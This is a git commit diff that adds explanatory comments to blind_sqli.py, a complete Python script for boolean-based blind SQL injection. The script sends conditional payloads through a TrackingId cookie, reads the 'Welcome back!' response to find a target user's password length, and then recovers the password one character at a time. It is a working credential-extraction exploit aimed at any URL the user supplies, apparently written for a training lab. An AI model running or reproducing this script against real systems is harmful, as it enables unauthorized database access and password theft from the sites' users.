160a0c56fe8a8e648ba0ac0927ff02531363ce9b
Ghossty55 <javierp052730@gmail.com>
2026-04-08 20:02:16 -0400

    Add code comments

--- blind_sqli.py
+++ blind_sqli.py
@@ -1,17 +1,20 @@
-import requests
-import string
-from urllib.parse import quote
+import requests #external library -->HTTP request
+import string #Standard module Character sets 
+from urllib.parse import quote#Standard module -->URL encoding
 
 
 
-
+#User inputs--> target especifics values required to build a sql payloads
 url= input("URL TARGET:   ")
-tracking_id= input("TrackingId:   ")
-session= input("Session Cookie: ")
-table= input("Users table name:    ")
-user= input("Username target:    ")
+tracking_id= input("TrackingId: ") #vulnerable cookie parameter -->Injection point
+session= input("Session Cookie: ")#active Session required for authenticated responses
+table= input("Users table name:  ")
+user= input("Username target:  ")
 column_password= input("Name of column password:    ")
 
+
+#Loop 1: determine password length using conditional response 
+#Uses While true because the length is unknown - breaks when Welcome back! disappears
 length=1
 while True:
     payload = f"' AND (SELECT LENGTH({column_password}) FROM {table} WHERE username='{user}')>'{length}"
@@ -19,9 +22,9 @@ while True:
     response = requests.get(url, cookies=cookies)
     
     if "Welcome back!" in response.text:
-        length += 1
+        length += 1#password is longer, keep incrementing
     else:
-        break
+        break#length found , exit loop
 
 
 
@@ -29,18 +32,21 @@ characters = string.printable
 
 
 password=""
-for position in range(1, length + 1):
-    for char in characters:
+# Extract the password character by character 
+for position in range(1, length + 1):#iterate through each position in the password
+    for char in characters:#try every printiable character at current position
+        #build payload for current position and character
         payload_final= f"' AND (SELECT SUBSTRING({column_password},{position},1) FROM {table} WHERE username='{user}')='{char}"
         cookies= {"TrackingId": tracking_id + quote(payload_final), "session": session}
         response = requests.get(url, cookies=cookies)
         print(f"Testing: {char}  - Welcome back {'Welcome back!' in response.text}")
+        ##if Welcome back! appears,  correct character found
         if "Welcome back!" in response.text:
-            password += char
-            break
+            password += char#append found character to password
+            break#exit inner loop, move to the next position
         else:
             pass
-
+#output Results
 print(f"Password length: {length}")
 print(f"Password: {password}")
 
